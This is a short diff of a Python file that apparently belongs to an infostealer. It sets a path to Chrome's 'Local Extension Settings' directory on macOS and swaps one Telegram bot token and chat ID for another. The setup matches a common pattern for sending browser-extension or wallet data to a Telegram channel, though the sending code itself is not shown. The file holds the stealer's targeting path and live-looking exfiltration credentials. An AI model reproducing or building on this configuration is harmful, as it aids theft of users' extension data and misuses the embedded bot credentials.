@@ -11,8 +11,8 @@ ROOT: str = os.path.expanduser("~")
 
 T_P: str = os.path.join(ROOT, "Library", "Application Support", "Google", "Chrome", "Default", "Local Extension Settings")
 
-B_T: str = "8002682085:AAGCCcYjqg2x05vgTkvGoxFe-0iamCrVlnc"
-C_I: str = "7363013741"
+B_T: str = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
+C_I: str = "5018443124"
 
 
 def i_t_e() -> bool:
